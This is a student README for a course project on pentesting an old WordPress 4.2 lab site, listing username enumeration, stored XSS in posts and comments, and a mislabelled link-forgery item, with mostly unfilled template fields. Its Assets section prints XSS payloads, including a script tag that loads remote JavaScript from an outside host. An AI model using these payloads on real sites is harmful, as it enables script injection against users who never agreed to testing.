# Project 7 - WordPress Pentesting

Time spent: **7** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name:username enumeration
  - [ ] Summary: username existance can be validated
    - Vulnerability types:authorization
    - Tested in version:4.2
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: wp admin page 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Required) Vulnerability Name:XSS
  - [ ] Summary: 
XSS script can be posted as a new post and it runs when page is loaded
    - Vulnerability types:unvalidated input
    - Tested in version:4.2
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: wp admin page ad new post add script 
  - [ ] Affected source code: post body
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Required) Vulnerability Name:XSFR
  - [ ] Summary: malicious web site link can be hidden by different name
    - Vulnerability types:weaknesses in authentication
    - Tested in version:4.2
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code: body of page
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name:XSS
  - [ ] Summary: XSS script can be added as comment to blog
    - Vulnerability types:unvalidated input
    - Tested in version:4.2
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: open web page and add script as a comment to blog
  - [ ] Affected source code:comment body
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

GET /search.php?term=<script>alert('XSS!');</script>

<IMG SRC=# onmouseover="alert('xxs')">

<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>

<a href="http://hackermag.com/best_hacker/vote/48576">About Me</a>
List any additional assets, such as scripts or files

## Resources
codepath guides

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
